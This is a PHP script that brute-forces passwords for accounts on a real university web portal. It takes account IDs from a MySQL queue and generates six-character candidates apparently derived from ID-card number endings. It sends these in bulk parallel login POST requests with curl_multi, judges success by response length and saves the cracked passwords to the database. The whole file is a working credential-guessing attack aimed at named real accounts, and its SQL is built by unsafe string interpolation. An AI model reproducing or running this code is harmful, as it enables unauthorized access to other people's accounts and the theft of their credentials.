<meta http-equiv="Content-Type" content="text/html; charset=UTF8" />
<?php
include("config.php"); 
ini_set ('memory_limit', '128M');
$maxn = 100000; //扫描的范围
$last_dit = 11; //最后一位的大小
$lim = 500;

$filename = "run_my.txt";
//$fp = fopen($filename, "a+"); 
$textgzh = "00007949"; 

$password_len = 6;
$marklength = 8;
$numrows = $maxn * $last_dit;
$sum_time = 0;
$times = 0;

//phpinfo();
//return;
while (1) {
    $order = mysql_query("SELECT * FROM need_gao WHERE can_my != 'YES' ORDER BY rank DESC");

    //echo "test\n";

    while ($row_order = mysql_fetch_array($order) ) {
        $textgzh = $row_order['textgzh'];
        if ($row_order['can_my'] == "YES") continue;
        $begin = get_id( get_mark($textgzh), $last_dit );

        // save_mark("need_gao", "textgzh", $textgzh, "can_my", "NO");

        for ($i = $begin; $i <= $numrows; $i += $lim) {
            $start_time = microtime(true);
            $j = $i + $lim - 1;
            if ($j > $numrows) $j = $numrows;
            echo $textgzh . "\n";
            echo "[" . get_text_idcard($i, $last_dit) . "," .  get_text_idcard($j, $last_dit) . "]....\n";
            if (get_some($textgzh, $i, $j) ) {
                echo "------>You got it!<--------\n";
                save_mark("need_gao", "textgzh", $textgzh, "can_my", "YES");
                break;
            }
            else {
                echo "------>NO!<--------" . "\n";
                save_password($textgzh, get_text_idcard($j, $last_dit));
                save_mark("need_gao", "textgzh", $textgzh, "can_my", "NO");
            }
            $end_time = microtime(true);
            $sum_time += $end_time-$start_time;
            $times += 1;
            print "Time: ".round(($end_time-$start_time),1)." Sec\n";
            print "Aaverage time: " . round($sum_time / $lim / $times * 1000, 1) . " Sec/1000times\n";
        }	
    }
}

function get_id($text, $last_dit) {
	$tmp = substr($text, -1);
	$previou = substr($text, 0, -1); 
	if ($tmp == 'X') $tmp = 10;
	return $tmp + $previou * $last_dit;
}
function get_text_idcard($id, $last_dit) {
    $tmp = $id % $last_dit;
    $id = (int)($id / $last_dit);
    while (strlen($id) < 5) $id = '0' . $id;
    if ($tmp == 10) 
        $tmp = 'X';
    return $id . $tmp;
}

function get_some($textgzh, $begin, $end) { //begin,end 为10进制, 多线程
    $need_do = array();
    $need_len = $doing_len = 0;
    $doing = array();
    $post_info;
    $all_password;
    $times_lim = 10;

    $n = $end - $begin + 1;  //每条线程执行数量
    $last_dit = 11; //末尾是0~X
   

    for ($i = 0; $i < $n; $i++) {
        $password = (string)get_text_idcard($i + $begin, $last_dit); 
        $post_info[$i] = get_post_info($textgzh, $password);
        $all_password[$i] = $password; 
        $need[$need_len++] = $i;
    }
     $mh = curl_multi_init();    //make sure to "curl_multi_init()" only after "curl_init()"
    //echo $all_password[1] . "==================\n";
    $flag = 0;
    $times = 0;
    while ($need_len != 0) {
        $times++;
        echo "step1....---->num:" . $need_len . "<----\n";
        $doing = $need;
        $doing_len = $need_len;
        for ($i = 0; $i < $doing_len; $i++) {
            curl_multi_add_handle($mh, $post_info[$doing[$i]]);
            //echo $all_password[$i] . "\n";
        }
        $need_len = 0;

        if ($times < $times_lim) {
            do {
                $mrc = curl_multi_exec($mh, $active);//当无数据，active=true
                //curl_multi_select($mh);
            } while ($mrc == CURLM_CALL_MULTI_PERFORM);//当正在接受数据时
        }	
        $cont = 0;
        while ($active and $mrc == CURLM_OK) {//当无数据时或请求暂停时，active=true
            $cont++;
            if (curl_multi_select($mh) != -1) {
                do {
                    $mrc = curl_multi_exec($mh, $active);
                } while ($mrc == CURLM_CALL_MULTI_PERFORM);
            }
            if ($cont > 1000) break;
        }
        //}
        echo "step2....\n";
        //echo $times . " " . $times_lim . "\n";
        for ($j = 0; $j < $doing_len; $j++) {
            $k = $doing[$j];
            if ($k >= $n) break;
            if ($flag == 0) {
                if ($times < $times_lim) {
                    $output = curl_multi_getcontent($post_info[$k]);//获得返回信息
                }
                else $output = send_post($textgzh, $all_password[$k]);

                //echo $all_password[$k];
                    //echo "---->LOST<----\n";

                if (strlen($output) == 0) {
                    $need[$need_len++] = $k;
                }
                else {
                    $tmp = deal_output($output, $textgzh, $all_password[$k]);
                    if ($tmp == 1) 
                        $flag = 1;
                    else if ($tmp == -1) {
                        $need[$need_len++] = $k;
                    }
                }
            }        
            curl_multi_remove_handle($mh, $post_info[$k]);   //释放资源
        }
        if ($flag == 1) break;
    }

    
    for ($i = 0; $i < $n; $i++)
        curl_close($post_info[$i]);//关闭语柄	
    
    $m=memory_get_usage(); //获取当前占用内存
    unset($post_info );
    unset($all_password );
    unset($mh);
    $mm=memory_get_usage(); //unset()后再查看当前占用内存
    echo "Memory: " . $m . - $mm . '=' .($m - $mm) . "\n";
    if ($flag == 1) return true;
    else return false;
}

function deal_output($output, $textgzh, $password) {
    if (strlen($output) == 119) {
       // echo "---->NO<----\n";
		//save_mark($textgzh, "NO");	
		//save_password($textgzh, $password);
        return 0;
    }
    else if (strlen($output) == 83) {
        echo "---->YES<----\n";
        save_mark("used", "id1", $textgzh, "can_my", "YES");	
        save_password($textgzh, $password);
        fputs($filename, $textgzh . " " . $password . "\n");
        return 1;
    }
	else return -1;
}

function send_post($textgzh, $password) {
		$cookie_file = dirname(__FILE__) . '/cookie.txt';  //先获取cookies并保存
		$curlPost = 'Login.Token1=' . urlencode($textgzh).
					'&Login.Token2=' . urlencode($password). 
				    '&goto=http%3A%2F%2Fmy.whu.edu.cn%2FloginSuccess.portal&gotoOnFail=http%3A%2F%2Fmy.whu.edu.cn%2FloginFailure.portal';
		//echo $curlPost . "<hr />";
		$url = "http://my.whu.edu.cn/userPasswordValidate.portal";
		$ch = curl_init($url); //初始化
		curl_setopt($ch, CURLOPT_HEADER, 0); //不返回header部分
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //返回字符串，而非直接输出
		curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie_file); //存储cookies
		curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
		curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);
		curl_setopt($ch, CURLOPT_TIMEOUT, 15 );
		$output=curl_exec($ch);
		////curl_close($ch);
		return $output;
}

function get_post_info($textgzh, $password) {
		//$cookie_file = dirname(__FILE__) . '/cookie.txt';  //先获取cookies并保存
		$curlPost = 'Login.Token1=' . urlencode($textgzh).
					'&Login.Token2=' . urlencode($password). 
				    '&goto=http%3A%2F%2Fmy.whu.edu.cn%2FloginSuccess.portal&gotoOnFail=http%3A%2F%2Fmy.whu.edu.cn%2FloginFailure.portal';
		//echo $curlPost . "<hr />";
		$url = "http://my.whu.edu.cn/userPasswordValidate.portal";
		$ch = curl_init($url); //初始化
		curl_setopt($ch, CURLOPT_HEADER, 0); //不返回header部分
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //返回字符串，而非直接输出
		//curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie_file); //存储cookies
		curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
		curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		//$output=curl_exec($ch);
		//curl_close($ch);
		return $ch;
}

function save_mark($line, $field, $mark, $type, $now ) {
    $now = "'" . $now . "'";
    $mark = "'" . $mark . "'";
//echo $line . " " . $field . " " . $mark . " " . $type . " " . $now . " \n";
//echo "UPDATE {$line} SET {$type} = {$now} WHERE {$field} = {$mark} " . "\n";
	if ( !mysql_query("UPDATE {$line} SET {$type} = {$now}
						WHERE {$field} = {$mark}") ) {
			echo "Can't save mark!\n";
	}
}

function save_password($textgzh, $password) {
	if ( !mysql_query("UPDATE used SET my_password = '$password'
						WHERE id1 = '$textgzh'") ) {
			echo "Can't save mark!\n";
	}
}

function get_mark($textgzh) {
	$sql_data = mysql_query("SELECT my_password	 FROM used 
							 WHERE id1 = '$textgzh' ");
	if (!$sql_data) 
		echo "Can't get mark!\n";
    $row = mysql_fetch_array($sql_data);
    if ($row) {
        return $row['my_password'];
    }
    else {
        $sql_insert = mysql_query("INSERT INTO used (id1)
            VALUES ('$textgzh')");
        if (!$sql_insert) {
            echo "Can't insert new data " . $textgzh . "\n";
        }
        return 0;
    }
}
?>
